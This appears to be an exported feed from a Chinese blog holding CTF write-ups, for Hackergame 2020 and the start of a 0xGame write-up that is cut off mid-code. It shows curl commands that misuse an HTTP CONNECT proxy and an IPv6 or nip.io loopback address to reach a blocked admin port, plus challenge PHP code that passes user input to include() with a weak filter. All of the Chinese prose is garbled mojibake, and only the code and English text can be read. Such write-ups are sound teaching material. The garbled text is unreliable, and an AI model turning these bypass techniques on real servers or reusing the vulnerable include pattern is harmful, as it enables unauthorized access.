alt="postman"></p><p>è€Œ cURL éƒ½ç›´æ¥ä¸è®©ä½ ç”¨ã€‚æŠŠ headers éƒ½åŠ ä¸Šäº†ï¼Œä¹Ÿä¸çŸ¥é“ä»–æ€ä¹ˆåˆ¤æ–­åˆ°çš„ã€‚ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">"https://146.56.228.227/"</span> -H <span class="token string">"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"</span> -H <span class="token string">"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span> -H <span class="token string">"Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span> --compressed -H <span class="token string">"Connection: keep-alive"</span> -H <span class="token string">"Upgrade-Insecure-Requests: 1"</span> -H <span class="token string">"Pragma: no-cache"</span> -H <span class="token string">"Cache-Control: no-cache"</span> -H <span class="token string">"TE: Trailers"</span> -k -vv --http2</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107210632627.png" alt="curl"></p><p>ä½†æ˜¯è¿™ä¸ªä¿¡æ¯è‚¯å®šæ˜¯åœ¨ç½‘ç»œæµé‡Œä¼ è¾“çš„ï¼ŒWireshark æŠ“åŒ…çš„è¯è‚¯å®šèƒ½æŠ“åˆ°ã€‚</p><p>ä½†æ˜¯è¿™é‡Œç”¨åˆ°äº† tls åŠ å¯†ï¼Œç›´æ¥æŠ“æ˜¯æŠ“ä¸åˆ°æ˜æ–‡çš„ï¼Œç„¶è€Œæˆ‘åšè¿™é¢˜çš„æ—¶å€™æ²¡é…å¥½è¿˜æ˜¯æ²¡æŠ“åˆ°æ˜æ–‡ï¼ˆå¤§è‰ã€‚</p><p>é¦–å…ˆéœ€è¦åœ¨ç³»ç»Ÿè®¾ç½®ä¸€ä¸ª <code>SSLKEYLOGFILE</code> ç¯å¢ƒå˜é‡ï¼Œå˜é‡å€¼ä¸ºä½ å–œæ¬¢çš„è·¯å¾„ä¸‹å»ºçš„ä¸€ä¸ªç”¨æ¥ä¿å­˜ log çš„æ–‡ä»¶ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107230305958.png" alt="ç¼–è¾‘ç¯å¢ƒå˜é‡"></p><p>è€Œååœ¨ wireshark é‡Œè®¾ç½®æ–‡ä»¶è·¯å¾„ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107230402487.png" alt="Wiresharkè®¾ç½®"></p><p>å†æ‰“å¼€æµè§ˆå™¨è®¿é—®é¢˜ç›®ï¼Œå°±èƒ½åœ¨ wireshark é‡ŒæŠ“åˆ°æ˜æ–‡åŒ…äº†ã€‚</p><p>è¿½è¸ª TLS æµ / HTTP2 stream å°±èƒ½çœ‹åˆ°è¿™ä¸ªæ¨é€çš„ secret å’Œ flag1 äº†ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107230038744.png" alt="flag1"></p><blockquote><p><span class="github-emoji"><span>âš </span><img src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>æŠ“åŒ…å®Œæˆåè¯·åŠæ—¶åˆ é™¤æ­¤ç¯å¢ƒå˜é‡ï¼Œé˜²æ­¢ä¿¡æ¯æ³„éœ²ã€‚</strong> </p></blockquote><p>è¿™ä¸ªé¢˜çœ‹åˆ°å®˜æ–¹WP ç»™äº†åŸºäº nghttp2 çš„è§£æ³•ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">nghttp -v https://146.56.228.227/</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108000716189.png" alt="å¦ä¸€ç§è§£æ³•"></p><h3 id="å…¥ä¾µç®¡ç†ä¸­å¿ƒ"><a href="#å…¥ä¾µç®¡ç†ä¸­å¿ƒ" class="headerlink" title="å…¥ä¾µç®¡ç†ä¸­å¿ƒ"></a>å…¥ä¾µç®¡ç†ä¸­å¿ƒ</h3><p>ç½‘é¡µä¸Šçš„ ç®¡ç†ä¸­å¿ƒ URL ä¸º <a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a> ï¼Œè®¿é—® <a href="http://146.56.228.227:8080/">http://146.56.228.227:8080/</a> æç¤º</p><blockquote><p>ç®¡ç†ä¸­å¿ƒæ— æ³•ä»å…¬ç½‘ç›´æ¥è®¿é—®</p></blockquote><p>æ ¹æ® å¸®åŠ© ç»™å‡ºçš„æç¤ºï¼Œéœ€è¦åˆ©ç”¨ CONNECT åè®®ã€‚</p><p>æ ¹æ® <a href="https://tools.ietf.org/html/rfc7231#section-4.3.6">RFC 7231</a> ä¸­çš„ç›¸å…³å†…å®¹ï¼Œç»“åˆé¢˜ç›®æ‰€éœ€çš„<code>secret</code>ï¼Œè¯·æ±‚å¤´æ ¼å¼å¦‚ä¸‹ã€‚</p><pre class="language-none"><code class="language-none">CONNECT server.example.com:80 HTTP/1.1Host: server.example.com:80Secret: xxxxxxxx</code></pre><p>å†çœ‹è¿‡æ»¤çš„åˆ—è¡¨</p><blockquote><ul><li>å…¨çƒå•æ’­åœ°å€</li><li>10.0.0.0/8</li><li>127.0.0.0/8</li><li>172.16.0.0/12</li><li>192.168.0.0/16</li></ul></blockquote><p>å…¶ä¸­ä¸åŒ…æ‹¬ IPv6 åœ°å€ï¼Œå¯ä»¥è¯•è¯•æœ¬åœ°ç¯å›ï¼Œå³<code>[::1]</code>ã€‚</p><p>æ„é€ è¯·æ±‚å‘è¿‡å»è¯•è¯•ï¼Œå‘ç°æˆåŠŸå»ºç«‹è¿æ¥ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107233927125.png" alt="æˆåŠŸå»ºç«‹è¿æ¥"></p><blockquote><p>The recipient proxy can establish a tunnel either by directly connecting to the request-target or, if configured to use another proxy, by forwarding the CONNECT request to the next inbound proxy. Any 2xx (Successful) response indicates that the sender (and all inbound proxies) will switch to tunnel mode immediately after the blank line that concludes the successful responseâ€™s header section; data received after that blank line is from the server identified by the request-target.  Any response other than a successful response indicates that the tunnel has not yet been formed and that the connection remains governed by HTTP.</p><p>A tunnel is closed when a tunnel intermediary detects that either side has closed its connection: the intermediary MUST attempt to send any outstanding data that came from the closed side to the other side, close both connections, and then discard any remaining data left undelivered.</p></blockquote><p>è¯´æ˜éš§é“å·²ç»å»ºç«‹äº†ï¼Œä½†è²Œä¼¼åšä¸åˆ°é©¬ä¸Šå‘ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œäºæ˜¯éš§é“å°±å…³é—­äº†ã€‚</p><p>ç”¨ Burp Suite å‘åŒ…è¿™ä¸ªæ–¹æ¡ˆä¸å®åœ¨ï¼ˆï¼ˆ</p><p>å¥½çƒ¦å•Šå–µï¼Œç”¨ curl å¥½äº†å§ã€‚ï¼ˆå‚è€ƒäº†å®˜æ–¹ WPï¼‰</p><p>éœ€è¦å¸¦ä¸Š Refererï¼Œå¦åˆ™ä¼šæç¤º </p><blockquote><p>ç®¡ç†ä¸­å¿ƒéœ€è¦ä» â€˜146.56.228.227â€™ è¢«è®¿é—®(Referer)</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> -x https://146.56.228.227:443 --proxy-insecure -vvnn -p --proxy-header <span class="token string">"Secret: aa08235651"</span> http://<span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080 -H <span class="token string">"Referer: 146.56.228.227"</span>* Rebuilt URL to: http://<span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080/* Couldn't <span class="token function">find</span> <span class="token function">host</span> ::1 <span class="token keyword">in</span> the .netrc <span class="token function">file</span><span class="token punctuation">;</span> using defaults*   Trying <span class="token number">146.56</span>.228.227<span class="token punctuation">..</span>.* TCP_NODELAY <span class="token builtin class-name">set</span>* Connected to <span class="token number">146.56</span>.228.227 <span class="token punctuation">(</span><span class="token number">146.56</span>.228.227<span class="token punctuation">)</span> port <span class="token number">443</span> <span class="token punctuation">(</span><span class="token comment">#0)</span>* successfully <span class="token builtin class-name">set</span> certificate verify locations:*   CAfile: /etc/ssl/certs/ca-certificates.crt  CApath: /etc/ssl/certs* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS handshake, Client hello <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Server hello <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Unknown <span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Certificate <span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, CERT verify <span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Finished <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS change cipher, Client hello <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS handshake, Finished <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>:* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256* Proxy certificate:*  subject: <span class="token assign-left variable">O</span><span class="token operator">=</span>mkcert development certificate<span class="token punctuation">;</span> <span class="token assign-left variable">OU</span><span class="token operator">=</span>root@hg20-debian*  start date: Jun  <span class="token number">1</span> 00:00:00 <span class="token number">2019</span> GMT*  expire date: Oct <span class="token number">23</span> 01:13:11 <span class="token number">2030</span> GMT*  issuer: <span class="token assign-left variable">O</span><span class="token operator">=</span>mkcert development CA<span class="token punctuation">;</span> <span class="token assign-left variable">OU</span><span class="token operator">=</span>root@hg20-debian<span class="token punctuation">;</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>mkcert root@hg20-debian*  SSL certificate verify result: unable to get <span class="token builtin class-name">local</span> issuer certificate <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>, continuing anyway.* allocate connect buffer<span class="token operator">!</span>* Establish HTTP proxy tunnel to ::1:8080* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:<span class="token operator">&gt;</span> CONNECT <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080 HTTP/1.1<span class="token operator">&gt;</span> Host: <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080<span class="token operator">&gt;</span> User-Agent: curl/7.58.0<span class="token operator">&gt;</span> Proxy-Connection: Keep-Alive<span class="token operator">&gt;</span> Secret: aa08235651<span class="token operator">&gt;</span> * TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Newsession Ticket <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>:* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:<span class="token operator">&lt;</span> HTTP/1.1 <span class="token number">200</span> OK* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:<span class="token operator">&lt;</span> Content-Length: <span class="token number">0</span>* Ignoring Content-Length <span class="token keyword">in</span> CONNECT <span class="token number">200</span> response* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:<span class="token operator">&lt;</span> * Proxy replied <span class="token number">200</span> to CONNECT request* CONNECT phase completed<span class="token operator">!</span>* CONNECT phase completed<span class="token operator">!</span>* CONNECT phase completed<span class="token operator">!</span>* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:<span class="token operator">&gt;</span> GET / HTTP/1.1<span class="token operator">&gt;</span> Host: <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080<span class="token operator">&gt;</span> User-Agent: curl/7.58.0<span class="token operator">&gt;</span> Accept: */*<span class="token operator">&gt;</span> Referer: <span class="token number">146.56</span>.228.227<span class="token operator">&gt;</span> * TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:<span class="token operator">&lt;</span> HTTP/1.1 <span class="token number">200</span> OK<span class="token operator">&lt;</span> Date: Sat, 07 Nov <span class="token number">2020</span> <span class="token number">15</span>:59:36 GMT<span class="token operator">&lt;</span> Content-Length: <span class="token number">32</span><span class="token operator">&lt;</span> Content-Type: text/plain<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8<span class="token operator">&lt;</span> * Connection <span class="token comment">#0 to host 146.56.228.227 left intact</span>flag2: flag<span class="token punctuation">{</span>c0me_1n_t4_my_h0use<span class="token punctuation">}</span></code></pre><p>å¦å¤–çœ‹åˆ° <a href="https://imlonghao.com/58.html">imlonghao å¸ˆå‚…çš„å‘½ä»¤å¤§æ³•</a>ã€‚ï¼ˆåŸæ¥çš„ä»£ç åœ¨æˆ‘è¿™ Ubuntu æŠ¥é”™ï¼Œäºæ˜¯æ”¹äº†ä¸€ä¸‹åå¼•å·æ‰§è¡Œï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -v -k --proxy https://146.56.228.227/ --proxy-insecure --proxy-header <span class="token string">"Secret: <span class="token variable"><span class="token variable">`</span><span class="token punctuation">(</span>nghttp https://146.56.228.227/ <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> secret: <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$4</span>}'</span><span class="token punctuation">)</span><span class="token variable">`</span></span>"</span> http://www.ustc.edu.cn.127.0.0.1.nip.io:8080/ -p -H <span class="token string">"Referer: https://146.56.228.227"</span></code></pre><p>BTWï¼Œ <a href="http://www.ustc.edu.cn.127.0.0.1.nip.io/">www.ustc.edu.cn.127.0.0.1.nip.io</a> è¿™ä¸ªåŸŸåä¼šè§£æåˆ° 127.0.0.1ï¼Œè¯¦è§ <a href="https://nip.io/">https://nip.io</a> ä»»æ„ IP DNS æ³›åŸŸåã€‚</p><hr><h2 id="ä¸ç»æ„ä¼ è¾“"><a href="#ä¸ç»æ„ä¼ è¾“" class="headerlink" title="ä¸ç»æ„ä¼ è¾“"></a>ä¸ç»æ„ä¼ è¾“</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> random <span class="token keyword">import</span> SystemRandom<span class="token keyword">import</span> os<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    random <span class="token operator">=</span> SystemRandom<span class="token punctuation">(</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span>e<span class="token punctuation">)</span>    m0 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span>    m1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span>    x0 <span class="token operator">=</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span>key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>    x1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span>key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"x0 ="</span><span class="token punctuation">,</span> x0<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"x1 ="</span><span class="token punctuation">,</span> x1<span class="token punctuation">)</span>    v <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"v = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    m0_ <span class="token operator">=</span> <span class="token punctuation">(</span>m0 <span class="token operator">+</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>v <span class="token operator">-</span> x0<span class="token punctuation">,</span> key<span class="token punctuation">.</span>d<span class="token punctuation">,</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>n    m1_ <span class="token operator">=</span> <span class="token punctuation">(</span>m1 <span class="token operator">+</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>v <span class="token operator">-</span> x1<span class="token punctuation">,</span> key<span class="token punctuation">.</span>d<span class="token punctuation">,</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>n    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m0_ ="</span><span class="token punctuation">,</span> m0_<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m1_ ="</span><span class="token punctuation">,</span> m1_<span class="token punctuation">)</span>    guess0 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"m0 = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    guess1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"m1 = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> guess0 <span class="token operator">==</span> m0<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> guess1 <span class="token operator">==</span> m1<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nope"</span><span class="token punctuation">)</span></code></pre><h3 id="è§£å¯†æ¶ˆæ¯"><a href="#è§£å¯†æ¶ˆæ¯" class="headerlink" title="è§£å¯†æ¶ˆæ¯"></a>è§£å¯†æ¶ˆæ¯</h3><p>ç›´æ¥ä»¤ <code>v = x0</code>ï¼Œè¿™æ ·ç›´æ¥å°± <code>m0_ = m0</code> äº†ï¼Œå¾—åˆ° flag1.</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105215141495.png" alt="flag1"></p><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ€»è€Œè¨€ä¹‹ï¼Œè¿™æ¬¡ Hackergame <strong>é¢˜ç›®å¾ˆæœ‰æ¢¯åº¦ï¼Œå¾ˆæœ‰è„‘æ´ï¼Œæ„Ÿè§‰ä¸é”™ï¼Œå­¦åˆ°äº†è®¸å¤šï¼Œä¸‹æ¬¡è¿˜æ¥</strong>ã€‚</p><p>æ’åçš„è¯ä¸åœå¼¹è·³ï¼Œå¥½ä¸å®¹æ˜“åšå‡ºé“é¢˜ç›®ä¸Šå»äº†ï¼Œè€Œåæ‰ä¸‹æ¥ï¼Œåˆ°äº†æœ€é«˜çš„è®°å½•ä¹Ÿå°±æ€»æ¦œ rk31 äº†ï¼Œæœ€åè¿˜æ˜¯ä¸åœå¾€ä¸‹æ‰ï¼Œæœ€åéƒ½åˆ°æ€»æ¦œ rk41äº†ï¼Œ233.</p><p><img src="/2020/11/08/CTF_2020Hackergame/image_2020-11-07_15-31-29.png" alt="æ€»æ’å"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108033648244.png" alt="è§£é¢˜æƒ…å†µ"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108033920730.png" alt="è§£é¢˜æƒ…å†µ"></p><p>rk31 é¡ºä¾¿ç•™ä¸ªçºªå¿µğŸ‘‡</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108033613828.png" alt="æœ€é«˜è®°å½•"></p><p>å¤§å¸ˆå‚…ä»¬å¤ªå¼ºäº†ï¼</p><p>å–µå‘œï¼Œè¿˜æ˜¯å¤ªèœäº†å•Šï¼Œæˆ‘è‡ªå·±çˆ¬ï¼ˆ</p><hr><p>æ„Ÿè§‰è¿™ç¯‡å¯ä»¥è¯´æ˜¯æœ€é•¿ä¸€ç¯‡åšå®¢äº†å”‰</p><p>ï¼ˆå…ˆè¿™æ ·å§ å†™ä¸åŠ¨äº†</p><p>ï¼ˆæºœäº†æºœäº†å–µ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 0xGame Web&amp;Misc éƒ¨åˆ†WriteUp</title>
      <link href="2020/11/05/CTF_2020_0xGame/"/>
      <url>2020/11/05/CTF_2020_0xGame/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å—é‚®çš„å¸ˆå‚…ä»¬æ•´äº†ä¸ª 0xGameï¼Œæ¯”èµ›æŒç»­äº†ä¸€ä¸ªæœˆï¼Œæ¯å‘¨æ”¾å‡ºä¸€å®šçš„é¢˜ç›®ã€‚</p><p>å¤§æ¦‚çœ‹äº†çœ‹ï¼Œé¢˜ç›®è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ã€‚</p><blockquote><p>æ¯”èµ›å¹³å°ï¼š<a href="http://game.0xctf.com/">http://game.0xctf.com/</a></p><p>å¾€æœŸèµ›é¢˜ç¯å¢ƒï¼š<a href="https://shimo.im/docs/8hkRHdRDdWyKycyK">https://shimo.im/docs/8hkRHdRDdWyKycyK</a></p></blockquote><p>ä¸»è¦é¡ºä¾¿æ€»ç»“äº†ä¸€ä¸‹ <strong>PHP SESSION åºåˆ—åŒ–å¼•æ“ä¸åŒå¸¦æ¥çš„ååºåˆ—åŒ–æ¼æ´</strong>å§ã€‚</p><p><em>ï¼ˆç”±äºæ¯”è¾ƒæ‡’å°±æ²¡æ€ä¹ˆå†™ WPï¼Œå†™çš„ä¹Ÿæ¯”è¾ƒç®€ç•¥</em></p><p>å˜¤å˜¤å˜¤ï¼ˆè·‘</p><hr><h2 id="Week-4"><a href="#Week-4" class="headerlink" title="Week 4"></a>Week 4</h2><h3 id="Web-switch"><a href="#Web-switch" class="headerlink" title="Web_switch"></a>Web_switch</h3><blockquote><p>å°æ˜åœ¨ä½¿ç”¨vimæ—¶ç”µè„‘æ­»æœºäº†ï¼Œä½†æ˜¯ä»–å†™çš„ä»£ç è¿˜æ²¡æœ‰ä¿å­˜ï¼Œè¿™å¯æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p><a href="http://web.game.0xctf.com:30103/">http://web.game.0xctf.com:30103/</a></p></blockquote><p>è®¿é—®æ˜¾ç¤º</p><blockquote><p>Do you know vim in Linux?</p></blockquote><p>æƒ³åˆ°åº”è¯¥æ˜¯ vim çš„ç¼“å­˜æ–‡ä»¶å§ã€‚</p><p>å³ <code>.index.php.swp</code></p><p>ä¸‹è½½ä»¥åç”¨ vim åŠ è½½</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> -r .index.php.swp</code></pre><p>è€Œå <code>:wq</code> ä¿å­˜å¾—åˆ°æºç ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in flag.php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;h1 align="center"&gt;&lt;font color="red"&gt;Do you know vim in Linux?&lt;/font&gt;&lt;/h1&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0xGame Good!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|base64/'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 